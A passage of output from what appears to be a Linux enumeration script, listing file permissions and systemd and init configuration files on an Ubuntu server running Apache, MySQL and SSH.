 588K -rwxr-xr-x 1 root root  586K Apr  5  2016 /usr/sbin/rsyslogd
 776K -rwxr-xr-x 1 root root  773K Mar  4  2019 /usr/sbin/sshd


[-] /etc/init.d/ binary permissions:
total 264
drwxr-xr-x  2 root root 4096 Jan 15  2020 .
drwxr-xr-x 92 root root 4096 Jan 20  2020 ..
-rwxr-xr-x  1 root root 8087 Jun 11  2018 apache2
-rwxr-xr-x  1 root root 2210 Jun 11  2018 apache-htcacheclean
-rwxr-xr-x  1 root root 6223 Mar  3  2017 apparmor
-rwxr-xr-x  1 root root 1275 Jan 19  2016 bootmisc.sh
-rwxr-xr-x  1 root root 3807 Jan 19  2016 checkfs.sh
-rwxr-xr-x  1 root root 1098 Jan 19  2016 checkroot-bootclean.sh
-rwxr-xr-x  1 root root 9353 Jan 19  2016 checkroot.sh
-rwxr-xr-x  1 root root 1343 Apr  4  2016 console-setup
-rwxr-xr-x  1 root root 3049 Apr  5  2016 cron
-rwxr-xr-x  1 root root 2813 Dec  1  2015 dbus
-rw-r--r--  1 root root 1365 Jan 15  2020 .depend.boot
-rw-r--r--  1 root root  539 Jan 15  2020 .depend.start
-rw-r--r--  1 root root  709 Jan 15  2020 .depend.stop
-rwxr-xr-x  1 root root 1105 Apr 26  2019 grub-common
-rwxr-xr-x  1 root root 1336 Jan 19  2016 halt
-rwxr-xr-x  1 root root 1423 Jan 19  2016 hostname.sh
-rwxr-xr-x  1 root root 3809 Mar 12  2016 hwclock.sh
-rwxr-xr-x  1 root root 2372 Apr 11  2016 irqbalance
-rwxr-xr-x  1 root root 1804 Apr  4  2016 keyboard-setup
-rwxr-xr-x  1 root root 1300 Jan 19  2016 killprocs
-rwxr-xr-x  1 root root 2087 Dec 20  2015 kmod
-rwxr-xr-x  1 root root  703 Jan 19  2016 mountall-bootclean.sh
-rwxr-xr-x  1 root root 2301 Jan 19  2016 mountall.sh
-rwxr-xr-x  1 root root 1461 Jan 19  2016 mountdevsubfs.sh
-rwxr-xr-x  1 root root 1564 Jan 19  2016 mountkernfs.sh
-rwxr-xr-x  1 root root  711 Jan 19  2016 mountnfs-bootclean.sh
-rwxr-xr-x  1 root root 2456 Jan 19  2016 mountnfs.sh
-rwxr-xr-x  1 root root 5607 Feb  3  2017 mysql
-rwxr-xr-x  1 root root 4771 Jul 19  2015 networking
-rwxr-xr-x  1 root root 1581 Oct 15  2015 ondemand
-rwxr-xr-x  1 root root 1846 Mar 22  2018 open-vm-tools
-rwxr-xr-x  1 root root 1366 Nov 15  2015 plymouth
-rwxr-xr-x  1 root root  752 Nov 15  2015 plymouth-log
-rwxr-xr-x  1 root root 1192 Sep  5  2015 procps
-rwxr-xr-x  1 root root 6366 Jan 19  2016 rc
-rwxr-xr-x  1 root root  820 Jan 19  2016 rc.local
-rwxr-xr-x  1 root root  117 Jan 19  2016 rcS
-rw-r--r--  1 root root 2427 Jan 19  2016 README
-rwxr-xr-x  1 root root  661 Jan 19  2016 reboot
-rwxr-xr-x  1 root root 4149 Nov 23  2015 resolvconf
-rwxr-xr-x  1 root root 4355 Jul 10  2014 rsync
-rwxr-xr-x  1 root root 2796 Feb  3  2016 rsyslog
-rwxr-xr-x  1 root root 3927 Jan 19  2016 sendsigs
-rwxr-xr-x  1 root root  597 Jan 19  2016 single
-rw-r--r--  1 root root 1087 Jan 19  2016 skeleton
-rwxr-xr-x  1 root root 4077 Aug 21  2018 ssh
-rwxr-xr-x  1 root root 6087 Apr 12  2016 udev
-rwxr-xr-x  1 root root 2049 Aug  7  2014 ufw
-rwxr-xr-x  1 root root 2737 Jan 19  2016 umountfs
-rwxr-xr-x  1 root root 2202 Jan 19  2016 umountnfs.sh
-rwxr-xr-x  1 root root 1879 Jan 19  2016 umountroot
-rwxr-xr-x  1 root root 3111 Jan 19  2016 urandom
-rwxr-xr-x  1 root root 1306 May 16  2018 uuidd
-rwxr-xr-x  1 root root 2757 Jan 19  2017 x11-common


[-] /etc/init/ config file permissions:
total 132
drwxr-xr-x  2 root root 4096 Jan 15  2020 .
drwxr-xr-x 92 root root 4096 Jan 20  2020 ..
-rw-r--r--  1 root root 3709 Mar  3  2017 apparmor.conf
-rw-r--r--  1 root root  250 Apr  4  2016 console-font.conf
-rw-r--r--  1 root root  509 Apr  4  2016 console-setup.conf
-rw-r--r--  1 root root  297 Apr  5  2016 cron.conf
-rw-r--r--  1 root root  482 Sep  1  2015 dbus.conf
-rw-r--r--  1 root root 1247 Jun  1  2015 friendly-recovery.conf
-rw-r--r--  1 root root  284 Jul 23  2013 hostname.conf
-rw-r--r--  1 root root  300 May 21  2014 hostname.sh.conf
-rw-r--r--  1 root root  674 Mar 14  2016 hwclock.conf
-rw-r--r--  1 root root  561 Mar 14  2016 hwclock-save.conf
-rw-r--r--  1 root root  109 Mar 14  2016 hwclock.sh.conf
-rw-r--r--  1 root root  597 Apr 11  2016 irqbalance.conf
-rw-r--r--  1 root root  689 Aug 20  2015 kmod.conf
-rw-r--r--  1 root root 1757 Feb  3  2017 mysql.conf
-rw-r--r--  1 root root 2493 Jun  2  2015 networking.conf
-rw-r--r--  1 root root  933 Jun  2  2015 network-interface.conf
-rw-r--r--  1 root root  530 Jun  2  2015 network-interface-container.conf
-rw-r--r--  1 root root 1756 Jun  2  2015 network-interface-security.conf
-rw-r--r--  1 root root  568 Feb  1  2016 passwd.conf
-rw-r--r--  1 root root  119 Jun  5  2014 procps.conf
-rw-r--r--  1 root root  363 Jun  5  2014 procps-instance.conf
-rw-r--r--  1 root root  457 Jun  3  2015 resolvconf.conf
-rw-r--r--  1 root root  426 Dec  2  2015 rsyslog.conf
-rw-r--r--  1 root root  230 Apr  4  2016 setvtrgb.conf
-rw-r--r--  1 root root  641 Aug 21  2018 ssh.conf
-rw-r--r--  1 root root  337 Apr 12  2016 udev.conf
-rw-r--r--  1 root root  360 Apr 12  2016 udevmonitor.conf
-rw-r--r--  1 root root  352 Apr 12  2016 udevtrigger.conf
-rw-r--r--  1 root root  473 Aug  7  2014 ufw.conf
-rw-r--r--  1 root root  889 Feb 24  2015 ureadahead.conf
-rw-r--r--  1 root root  683 Feb 24  2015 ureadahead-other.conf


[-] /lib/systemd/* config file permissions:
/lib/systemd/:
total 8.3M
drwxr-xr-x 27 root root  12K Jan 15  2020 system
drwxr-xr-x  2 root root 4.0K Jan 15  2020 system-sleep
drwxr-xr-x  2 root root 4.0K Jan 15  2020 system-generators
drwxr-xr-x  2 root root 4.0K Jan 15  2020 system-preset
drwxr-xr-x  2 root root 4.0K Jan 15  2020 network
-rwxr-xr-x  1 root root 443K Feb 13  2019 systemd-udevd
-rwxr-xr-x  1 root root 268K Feb 13  2019 systemd-cgroups-agent
-rwxr-xr-x  1 root root 301K Feb 13  2019 systemd-fsck
-rwxr-xr-x  1 root root 276K Feb 13  2019 systemd-initctl
-rwxr-xr-x  1 root root 340K Feb 13  2019 systemd-localed
-rwxr-xr-x  1 root root  51K Feb 13  2019 systemd-modules-load
-rwxr-xr-x  1 root root  35K Feb 13  2019 systemd-user-sessions
-rwxr-xr-x  1 root root 1.6M Feb 13  2019 systemd
-rwxr-xr-x  1 root root  15K Feb 13  2019 systemd-ac-power
-rwxr-xr-x  1 root root 103K Feb 13  2019 systemd-bootchart
-rwxr-xr-x  1 root root  91K Feb 13  2019 systemd-cryptsetup
-rwxr-xr-x  1 root root  31K Feb 13  2019 systemd-hibernate-resume
-rwxr-xr-x  1 root root 332K Feb 13  2019 systemd-hostnamed
-rwxr-xr-x  1 root root 319K Feb 13  2019 systemd-journald
-rwxr-xr-x  1 root root 123K Feb 13  2019 systemd-networkd-wait-online
-rwxr-xr-x  1 root root  35K Feb 13  2019 systemd-quotacheck
-rwxr-xr-x  1 root root  51K Feb 13  2019 systemd-remount-fs
-rwxr-xr-x  1 root root  91K Feb 13  2019 systemd-rfkill
-rwxr-xr-x  1 root root 143K Feb 13  2019 systemd-shutdown
-rwxr-xr-x  1 root root  71K Feb 13  2019 systemd-sleep
-rwxr-xr-x  1 root root  91K Feb 13  2019 systemd-socket-proxyd
-rwxr-xr-x  1 root root  55K Feb 13  2019 systemd-sysctl
-rwxr-xr-x  1 root root 333K Feb 13  2019 systemd-timedated
-rwxr-xr-x  1 root root 139K Feb 13  2019 systemd-timesyncd
-rwxr-xr-x  1 root root  55K Feb 13  2019 systemd-activate
-rwxr-xr-x  1 root root  91K Feb 13  2019 systemd-backlight
-rwxr-xr-x  1 root root  47K Feb 13  2019 systemd-binfmt
-rwxr-xr-x  1 root root 352K Feb 13  2019 systemd-bus-proxyd
-rwxr-xr-x  1 root root  75K Feb 13  2019 systemd-fsckd
-rwxr-xr-x  1 root root 605K Feb 13  2019 systemd-logind
-rwxr-xr-x  1 root root 836K Feb 13  2019 systemd-networkd
-rwxr-xr-x  1 root root  39K Feb 13  2019 systemd-random-seed
-rwxr-xr-x  1 root root  31K Feb 13  2019 systemd-reply-password
-rwxr-xr-x  1 root root 657K Feb 13  2019 systemd-resolved
-rwxr-xr-x  1 root root 276K Feb 13  2019 systemd-update-utmp
-rwxr-xr-x  1 root root 1.3K Nov 15  2018 systemd-sysv-install
drwxr-xr-x  2 root root 4.0K Apr 12  2016 system-shutdown

/lib/systemd/system:
total 828K
drwxr-xr-x 2 root root 4.0K Jan 15  2020 apache2.service.d
drwxr-xr-x 2 root root 4.0K Jan 15  2020 halt.target.wants
drwxr-xr-x 2 root root 4.0K Jan 15  2020 initrd-switch-root.target.wants
drwxr-xr-x 2 root root 4.0K Jan 15  2020 kexec.target.wants
drwxr-xr-x 2 root root 4.0K Jan 15  2020 multi-user.target.wants
drwxr-xr-x 2 root root 4.0K Jan 15  2020 poweroff.target.wants
drwxr-xr-x 2 root root 4.0K Jan 15  2020 reboot.target.wants
drwxr-xr-x 2 root root 4.0K Jan 15  2020 sysinit.target.wants
drwxr-xr-x 2 root root 4.0K Jan 15  2020 sockets.target.wants
drwxr-xr-x 2 root root 4.0K Jan 15  2020 systemd-resolved.service.d
drwxr-xr-x 2 root root 4.0K Jan 15  2020 systemd-timesyncd.service.d
drwxr-xr-x 2 root root 4.0K Jan 15  2020 timers.target.wants
lrwxrwxrwx 1 root root   21 Jan 15  2020 udev.service -> systemd-udevd.service
lrwxrwxrwx 1 root root    9 Jan 15  2020 umountfs.service -> /dev/null
lrwxrwxrwx 1 root root    9 Jan 15  2020 umountnfs.service -> /dev/null
lrwxrwxrwx 1 root root    9 Jan 15  2020 umountroot.service -> /dev/null
lrwxrwxrwx 1 root root   27 Jan 15  2020 urandom.service -> systemd-random-seed.service
lrwxrwxrwx 1 root root    9 Jan 15  2020 x11-common.service -> /dev/null
lrwxrwxrwx 1 root root   17 Jan 15  2020 runlevel4.target -> multi-user.target
lrwxrwxrwx 1 root root   16 Jan 15  2020 runlevel5.target -> graphical.target
lrwxrwxrwx 1 root root   13 Jan 15  2020 runlevel6.target -> reboot.target
lrwxrwxrwx 1 root root    9 Jan 15  2020 sendsigs.service -> /dev/null
drwxr-xr-x 2 root root 4.0K Jan 15  2020 sigpwr.target.wants
lrwxrwxrwx 1 root root    9 Jan 15  2020 single.service -> /dev/null
lrwxrwxrwx 1 root root    9 Jan 15  2020 stop-bootlogd.service -> /dev/null
lrwxrwxrwx 1 root root    9 Jan 15  2020 stop-bootlogd-single.service -> /dev/null
drwxr-xr-x 2 root root 4.0K Jan 15  2020 rescue.target.wants
drwxr-xr-x 2 root root 4.0K Jan 15  2020 resolvconf.service.wants
lrwxrwxrwx 1 root root    9 Jan 15  2020 rmnologin.service -> /dev/null
lrwxrwxrwx 1 root root   15 Jan 15  2020 runlevel0.target -> poweroff.target
lrwxrwxrwx 1 root root   13 Jan 15  2020 runlevel1.target -> rescue.target
lrwxrwxrwx 1 root root   17 Jan 15  2020 runlevel2.target -> multi-user.target
lrwxrwxrwx 1 root root   17 Jan 15  2020 runlevel3.target -> multi-user.target
drwxr-xr-x 2 root root 4.0K Jan 15  2020 getty.target.wants
drwxr-xr-x 2 root root 4.0K Jan 15  2020 graphical.target.wants
lrwxrwxrwx 1 root root    9 Jan 15  2020 halt.service -> /dev/null
lrwxrwxrwx 1 root root    9 Jan 15  2020 hostname.service -> /dev/null
lrwxrwxrwx 1 root root    9 Jan 15  2020 hwclock.service -> /dev/null
lrwxrwxrwx 1 root root    9 Jan 15  2020 killprocs.service -> /dev/null
lrwxrwxrwx 1 root root   28 Jan 15  2020 kmod.service -> systemd-modules-load.service
drwxr-xr-x 2 root root 4.0K Jan 15  2020 local-fs.target.wants
lrwxrwxrwx 1 root root   28 Jan 15  2020 module-init-tools.service -> systemd-modules-load.service
lrwxrwxrwx 1 root root    9 Jan 15  2020 motd.service -> /dev/null
lrwxrwxrwx 1 root root    9 Jan 15  2020 mountall-bootclean.service -> /dev/null
lrwxrwxrwx 1 root root    9 Jan 15  2020 mountall.service -> /dev/null
lrwxrwxrwx 1 root root    9 Jan 15  2020 mountdevsubfs.service -> /dev/null
lrwxrwxrwx 1 root root    9 Jan 15  2020 mountkernfs.service -> /dev/null
lrwxrwxrwx 1 root root    9 Jan 15  2020 mountnfs-bootclean.service -> /dev/null
lrwxrwxrwx 1 root root    9 Jan 15  2020 mountnfs.service -> /dev/null
lrwxrwxrwx 1 root root   22 Jan 15  2020 procps.service -> systemd-sysctl.service
lrwxrwxrwx 1 root root   16 Jan 15  2020 rc.local.service -> rc-local.service
drwxr-xr-x 2 root root 4.0K Jan 15  2020 rc-local.service.d
lrwxrwxrwx 1 root root    9 Jan 15  2020 rc.service -> /dev/null
lrwxrwxrwx 1 root root    9 Jan 15  2020 rcS.service -> /dev/null
lrwxrwxrwx 1 root root    9 Jan 15  2020 reboot.service -> /dev/null
lrwxrwxrwx 1 root root    9 Jan 15  2020 cryptdisks-early.service -> /dev/null
lrwxrwxrwx 1 root root    9 Jan 15  2020 cryptdisks.service -> /dev/null
lrwxrwxrwx 1 root root   13 Jan 15  2020 ctrl-alt-del.target -> reboot.target
lrwxrwxrwx 1 root root   25 Jan 15  2020 dbus-org.freedesktop.hostname1.service -> systemd-hostnamed.service
lrwxrwxrwx 1 root root   23 Jan 15  2020 dbus-org.freedesktop.locale1.service -> systemd-localed.service
lrwxrwxrwx 1 root root   22 Jan 15  2020 dbus-org.freedesktop.login1.service -> systemd-logind.service
lrwxrwxrwx 1 root root   24 Jan 15  2020 dbus-org.freedesktop.network1.service -> systemd-networkd.service
lrwxrwxrwx 1 root root   24 Jan 15  2020 dbus-org.freedesktop.resolve1.service -> systemd-resolved.service
lrwxrwxrwx 1 root root   25 Jan 15  2020 dbus-org.freedesktop.timedate1.service -> systemd-timedated.service
lrwxrwxrwx 1 root root   16 Jan 15  2020 default.target -> graphical.target
lrwxrwxrwx 1 root root    9 Jan 15  2020 fuse.service -> /dev/null
lrwxrwxrwx 1 root root   14 Jan 15  2020 autovt@.service -> getty@.service
lrwxrwxrwx 1 root root    9 Jan 15  2020 bootlogd.service -> /dev/null
lrwxrwxrwx 1 root root    9 Jan 15  2020 bootlogs.service -> /dev/null
lrwxrwxrwx 1 root root    9 Jan 15  2020 bootmisc.service -> /dev/null
lrwxrwxrwx 1 root root    9 Jan 15  2020 checkfs.service -> /dev/null
lrwxrwxrwx 1 root root    9 Jan 15  2020 checkroot-bootclean.service -> /dev/null
lrwxrwxrwx 1 root root    9 Jan 15  2020 checkroot.service -> /dev/null
drwxr-xr-x 2 root root 4.0K Feb 26  2019 busnames.target.wants
-rw-r--r-- 1 root root  879 Feb 13  2019 basic.target
-rw-r--r-- 1 root root  379 Feb 13  2019 bluetooth.target
-rw-r--r-- 1 root root  358 Feb 13  2019 busnames.target
-rw-r--r-- 1 root root  770 Feb 13  2019 console-getty.service
-rw-r--r-- 1 root root  742 Feb 13  2019 console-shell.service
-rw-r--r-- 1 root root  791 Feb 13  2019 container-getty@.service
-rw-r--r-- 1 root root  394 Feb 13  2019 cryptsetup-pre.target
-rw-r--r-- 1 root root  366 Feb 13  2019 cryptsetup.target
-rw-r--r-- 1 root root 1010 Feb 13  2019 debug-shell.service
-rw-r--r-- 1 root root  670 Feb 13  2019 dev-hugepages.mount
-rw-r--r-- 1 root root  624 Feb 13  2019 dev-mqueue.mount
-rw-r--r-- 1 root root 1009 Feb 13  2019 emergency.service
-rw-r--r-- 1 root root  431 Feb 13  2019 emergency.target
-rw-r--r-- 1 root root  501 Feb 13  2019 exit.target
-rw-r--r-- 1 root root  440 Feb 13  2019 final.target
-rw-r--r-- 1 root root 1.5K Feb 13  2019 getty@.service
-rw-r--r-- 1 root root  460 Feb 13  2019 getty.target
-rw-r--r-- 1 root root  558 Feb 13  2019 graphical.target
-rw-r--r-- 1 root root  487 Feb 13  2019 halt.target
-rw-r--r-- 1 root root  447 Feb 13  2019 hibernate.target
-rw-r--r-- 1 root root  468 Feb 13  2019 hybrid-sleep.target
-rw-r--r-- 1 root root  630 Feb 13  2019 initrd-cleanup.service
-rw-r--r-- 1 root root  553 Feb 13  2019 initrd-fs.target
-rw-r--r-- 1 root root  790 Feb 13  2019 initrd-parse-etc.service
-rw-r--r-- 1 root root  526 Feb 13  2019 initrd-root-fs.target
-rw-r--r-- 1 root root  640 Feb 13  2019 initrd-switch-root.service
-rw-r--r-- 1 root root  691 Feb 13  2019 initrd-switch-root.target
-rw-r--r-- 1 root root  671 Feb 13  2019 initrd.target
-rw-r--r-- 1 root root  664 Feb 13  2019 initrd-udevadm-cleanup-db.service
-rw-r--r-- 1 root root  501 Feb 13  2019 kexec.target
-rw-r--r-- 1 root root  677 Feb 13  2019 kmod-static-nodes.service
-rw-r--r-- 1 root root  395 Feb 13  2019 local-fs-pre.target
-rw-r--r-- 1 root root  507 Feb 13  2019 local-fs.target
-rw-r--r-- 1 root root  405 Feb 13  2019 machine.slice
-rw-r--r-- 1 root root  473 Feb 13  2019 mail-transport-agent.target
-rw-r--r-- 1 root root  492 Feb 13  2019 multi-user.target
-rw-r--r-- 1 root root  464 Feb 13  2019 network-online.target
-rw-r--r-- 1 root root  461 Feb 13  2019 network-pre.target
-rw-r--r-- 1 root root  480 Feb 13  2019 network.target
-rw-r--r-- 1 root root  514 Feb 13  2019 nss-lookup.target
-rw-r--r-- 1 root root  473 Feb 13  2019 nss-user-lookup.target
-rw-r--r-- 1 root root  354 Feb 13  2019 paths.target
-rw-r--r-- 1 root root  552 Feb 13  2019 poweroff.target
-rw-r--r-- 1 root root  377 Feb 13  2019 printer.target
-rw-r--r-- 1 root root  693 Feb 13  2019 proc-sys-fs-binfmt_misc.automount
-rw-r--r-- 1 root root  603 Feb 13  2019 proc-sys-fs-binfmt_misc.mount
-rw-r--r-- 1 root root  568 Feb 13  2019 quotaon.service
-rw-r--r-- 1 root root  612 Feb 13  2019 rc-local.service
-rw-r--r-- 1 root root  543 Feb 13  2019 reboot.target
-rw-r--r-- 1 root root  396 Feb 13  2019 remote-fs-pre.target
-rw-r--r-- 1 root root  482 Feb 13  2019 remote-fs.target
-rw-r--r-- 1 root root  978 Feb 13  2019 rescue.service
-rw-r--r-- 1 root root  486 Feb 13  2019 rescue.target
-rw-r--r-- 1 root root  500 Feb 13  2019 rpcbind.target
-rw-r--r-- 1 root root 1.1K Feb 13  2019 serial-getty@.service
-rw-r--r-- 1 root root  402 Feb 13  2019 shutdown.target
-rw-r--r-- 1 root root  362 Feb 13  2019 sigpwr.target
-rw-r--r-- 1 root root  420 Feb 13  2019 sleep.target
-rw-r--r-- 1 root root  403 Feb 13  2019 -.slice
-rw-r--r-- 1 root root  409 Feb 13  2019 slices.target
-rw-r--r-- 1 root root  380 Feb 13  2019 smartcard.target
-rw-r--r-- 1 root root  356 Feb 13  2019 sockets.target
-rw-r--r-- 1 root root  380 Feb 13  2019 sound.target
-rw-r--r-- 1 root root  441 Feb 13  2019 suspend.target
-rw-r--r-- 1 root root  353 Feb 13  2019 swap.target
-rw-r--r-- 1 root root  715 Feb 13  2019 sys-fs-fuse-connections.mount
-rw-r--r-- 1 root root  518 Feb 13  2019 sysinit.target
-rw-r--r-- 1 root root  719 Feb 13  2019 sys-kernel-config.mount
-rw-r--r-- 1 root root  662 Feb 13  2019 sys-kernel-debug.mount
-rw-r--r-- 1 root root 1.3K Feb 13  2019 syslog.socket
-rw-r--r-- 1 root root  646 Feb 13  2019 systemd-ask-password-console.path
-rw-r--r-- 1 root root  653 Feb 13  2019 systemd-ask-password-console.service
-rw-r--r-- 1 root root  574 Feb 13  2019 systemd-ask-password-wall.path
-rw-r--r-- 1 root root  681 Feb 13  2019 systemd-ask-password-wall.service
-rw-r--r-- 1 root root  724 Feb 13  2019 systemd-backlight@.service
-rw-r--r-- 1 root root  959 Feb 13  2019 systemd-binfmt.service
-rw-r--r-- 1 root root  650 Feb 13  2019 systemd-bootchart.service
-rw-r--r-- 1 root root 1.0K Feb 13  2019 systemd-bus-proxyd.service
-rw-r--r-- 1 root root  409 Feb 13  2019 systemd-bus-proxyd.socket
-rw-r--r-- 1 root root  497 Feb 13  2019 systemd-exit.service
-rw-r--r-- 1 root root  551 Feb 13  2019 systemd-fsckd.service
-rw-r--r-- 1 root root  540 Feb 13  2019 systemd-fsckd.socket
-rw-r--r-- 1 root root  674 Feb 13  2019 systemd-fsck-root.service
-rw-r--r-- 1 root root  648 Feb 13  2019 systemd-fsck@.service
-rw-r--r-- 1 root root  544 Feb 13  2019 systemd-halt.service
-rw-r--r-- 1 root root  631 Feb 13  2019 systemd-hibernate-resume@.service
-rw-r--r-- 1 root root  501 Feb 13  2019 systemd-hibernate.service
-rw-r--r-- 1 root root  710 Feb 13  2019 systemd-hostnamed.service
-rw-r--r-- 1 root root  778 Feb 13  2019 systemd-hwdb-update.service
-rw-r--r-- 1 root root  519 Feb 13  2019 systemd-hybrid-sleep.service
-rw-r--r-- 1 root root  480 Feb 13  2019 systemd-initctl.service
-rw-r--r-- 1 root root  524 Feb 13  2019 systemd-initctl.socket
-rw-r--r-- 1 root root  607 Feb 13  2019 systemd-journald-audit.socket
-rw-r--r-- 1 root root 1.1K Feb 13  2019 systemd-journald-dev-log.socket
-rw-r--r-- 1 root root 1.3K Feb 13  2019 systemd-journald.service
-rw-r--r-- 1 root root  842 Feb 13  2019 systemd-journald.socket
-rw-r--r-- 1 root root  731 Feb 13  2019 systemd-journal-flush.service
-rw-r--r-- 1 root root  557 Feb 13  2019 systemd-kexec.service
-rw-r--r-- 1 root root  691 Feb 13  2019 systemd-localed.service
-rw-r--r-- 1 root root 1.2K Feb 13  2019 systemd-logind.service
-rw-r--r-- 1 root root  693 Feb 13  2019 systemd-machine-id-commit.service
-rw-r--r-- 1 root root  967 Feb 13  2019 systemd-modules-load.service
-rw-r--r-- 1 root root 1.3K Feb 13  2019 systemd-networkd.service
-rw-r--r-- 1 root root  591 Feb 13  2019 systemd-networkd.socket
-rw-r--r-- 1 root root  685 Feb 13  2019 systemd-networkd-wait-online.service
-rw-r--r-- 1 root root  553 Feb 13  2019 systemd-poweroff.service
-rw-r--r-- 1 root root  614 Feb 13  2019 systemd-quotacheck.service
-rw-r--r-- 1 root root  717 Feb 13  2019 systemd-random-seed.service
-rw-r--r-- 1 root root  548 Feb 13  2019 systemd-reboot.service
-rw-r--r-- 1 root root  757 Feb 13  2019 systemd-remount-fs.service
-rw-r--r-- 1 root root  907 Feb 13  2019 systemd-resolved.service
-rw-r--r-- 1 root root  696 Feb 13  2019 systemd-rfkill.service
-rw-r--r-- 1 root root  617 Feb 13  2019 systemd-rfkill.socket
-rw-r--r-- 1 root root  497 Feb 13  2019 systemd-suspend.service
-rw-r--r-- 1 root root  653 Feb 13  2019 systemd-sysctl.service
-rw-r--r-- 1 root root  655 Feb 13  2019 systemd-timedated.service
-rw-r--r-- 1 root root 1.1K Feb 13  2019 systemd-timesyncd.service
-rw-r--r-- 1 root root  598 Feb 13  2019 systemd-tmpfiles-clean.service
-rw-r--r-- 1 root root  450 Feb 13  2019 systemd-tmpfiles-clean.timer
-rw-r--r-- 1 root root  703 Feb 13  2019 systemd-tmpfiles-setup-dev.service
-rw-r--r-- 1 root root  683 Feb 13  2019 systemd-tmpfiles-setup.service
-rw-r--r-- 1 root root  578 Feb 13  2019 systemd-udevd-control.socket
-rw-r--r-- 1 root root  570 Feb 13  2019 systemd-udevd-kernel.socket
-rw-r--r-- 1 root root  825 Feb 13  2019 systemd-udevd.service
-rw-r--r-- 1 root root  823 Feb 13  2019 systemd-udev-settle.service
-rw-r--r-- 1 root root  743 Feb 13  2019 systemd-udev-trigger.service
-rw-r--r-- 1 root root  757 Feb 13  2019 systemd-update-utmp-runlevel.service
-rw-r--r-- 1 root root  754 Feb 13  2019 systemd-update-utmp.service
-rw-r--r-- 1 root root  573 Feb 13  2019 systemd-user-sessions.service
-rw-r--r-- 1 root root  436 Feb 13  2019 system.slice
-rw-r--r-- 1 root root  585 Feb 13  2019 system-update.target
-rw-r--r-- 1 root root  405 Feb 13  2019 timers.target
-rw-r--r-- 1 root root  395 Feb 13  2019 time-sync.target
-rw-r--r-- 1 root root  417 Feb 13  2019 umount.target
-rw-r--r-- 1 root root  528 Feb 13  2019 user@.service
-rw-r--r-- 1 root root  392 Feb 13  2019 user.slice
-rw-r--r-- 1 root root  342 Nov 15  2018 getty-static.service
-rw-r--r-- 1 root root  153 Nov 15  2018 sigpwr-container-shutdown.service
-rw-r--r-- 1 root root  175 Nov 15  2018 systemd-networkd-resolvconf-update.path
-rw-r--r-- 1 root root  715 Nov 15  2018 systemd-networkd-resolvconf-update.service
-rw-r--r-- 1 root root  225 Oct  9  2018 apt-daily.service
-rw-r--r-- 1 root root  156 Oct  9  2018 apt-daily.timer
-rw-r--r-- 1 root root  238 Oct  9  2018 apt-daily-upgrade.service
-rw-r--r-- 1 root root  184 Oct  9  2018 apt-daily-upgrade.timer
-rw-r--r-- 1 root root  618 Oct  2  2018 friendly-recovery.service
-rw-r--r-- 1 root root  172 Oct  2  2018 friendly-recovery.target
-rw-r--r-- 1 root root  445 Aug 21  2018 ssh.service
-rw-r--r-- 1 root root  196 Aug 21  2018 ssh@.service
-rw-r--r-- 1 root root  216 Aug 21  2018 ssh.socket
-rw-r--r-- 1 root root  189 May 16  2018 uuidd.service
-rw-r--r-- 1 root root  126 May 16  2018 uuidd.socket
lrwxrwxrwx 1 root root   27 May  9  2018 plymouth-log.service -> plymouth-read-write.service
lrwxrwxrwx 1 root root   21 May  9  2018 plymouth.service -> plymouth-quit.service
-rw-r--r-- 1 root root  412 May  9  2018 plymouth-halt.service
-rw-r--r-- 1 root root  426 May  9  2018 plymouth-kexec.service
-rw-r--r-- 1 root root  421 May  9  2018 plymouth-poweroff.service
-rw-r--r-- 1 root root  194 May  9  2018 plymouth-quit.service
-rw-r--r-- 1 root root  200 May  9  2018 plymouth-quit-wait.service
-rw-r--r-- 1 root root  244 May  9  2018 plymouth-read-write.service
-rw-r--r-- 1 root root  416 May  9  2018 plymouth-reboot.service
-rw-r--r-- 1 root root  532 May  9  2018 plymouth-start.service
-rw-r--r-- 1 root root  291 May  9  2018 plymouth-switch-root.service
-rw-r--r-- 1 root root  490 May  9  2018 systemd-ask-password-plymouth.path
-rw-r--r-- 1 root root  467 May  9  2018 systemd-ask-password-plymouth.service
-rw-r--r-- 1 root root  479 May  8  2018 run-vmblock-fuse.mount
-rw-r--r-- 1 root root  328 Apr 19  2018 open-vm-tools.service
-rw-r--r-- 1 root root  298 Mar 22  2018 vgauth.service
-rw-r--r-- 1 root root  420 Nov 29  2017 resolvconf.service
-rw-r--r-- 1 root root  411 Feb  3  2017 mysql.service
-rw-r--r-- 1 root root  269 Jan 31  2017 setvtrgb.service
-rw-r--r-- 1 root root  491 Jan 12  2017 dbus.service
-rw-r--r-- 1 root root  106 Jan 12  2017 dbus.socket
-rw-r--r-- 1 root root  735 Nov 30  2016 networking.service
-rw-r--r-- 1 root root  497 Nov 30  2016 ifup@.service
-rw-r--r-- 1 root root  631 Nov  3  2016 accounts-daemon.service
-rw-r--r-- 1 root root  285 Jun 16  2016 keyboard-setup.service
-rw-r--r-- 1 root root  288 Jun 16  2016 console-setup.service
drwxr-xr-x 2 root root 4.0K Apr 12  2016 runlevel1.target.wants
drwxr-xr-x 2 root root 4.0K Apr 12  2016 runlevel2.target.wants
drwxr-xr-x 2 root root 4.0K Apr 12  2016 runlevel3.target.wants
drwxr-xr-x 2 root root 4.0K Apr 12  2016 runlevel4.target.wants
drwxr-xr-x 2 root root 4.0K Apr 12  2016 runlevel5.target.wants
-rw-r--r-- 1 root root  251 Apr  5  2016 cron.service
-rw-r--r-- 1 root root  290 Apr  5  2016 rsyslog.service
-rw-r--r-- 1 root root  241 Mar  2  2015 ufw.service
-rw-r--r-- 1 root root  250 Feb 24  2015 ureadahead-stop.service
-rw-r--r-- 1 root root  242 Feb 24  2015 ureadahead-stop.timer
-rw-r--r-- 1 root root  401 Feb 24  2015 ureadahead.service
-rw-r--r-- 1 root root  188 Feb 24  2014 rsync.service

/lib/systemd/system/apache2.service.d:
total 4.0K
-rw-r--r-- 1 root root 42 Jun 11  2018 apache2-systemd.conf

/lib/systemd/system/halt.target.wants:
total 0
lrwxrwxrwx 1 root root 24 May  9  2018 plymouth-halt.service -> ../plymouth-halt.service

/lib/systemd/system/initrd-switch-root.target.wants:
total 0
lrwxrwxrwx 1 root root 25 May  9  2018 plymouth-start.service -> ../plymouth-start.service
lrwxrwxrwx 1 root root 31 May  9  2018 plymouth-switch-root.service -> ../plymouth-switch-root.service

/lib/systemd/system/kexec.target.wants:
total 0
lrwxrwxrwx 1 root root 25 May  9  2018 plymouth-kexec.service -> ../plymouth-kexec.service

/lib/systemd/system/multi-user.target.wants:
total 0
lrwxrwxrwx 1 root root 15 Jan 15  2020 getty.target -> ../getty.target
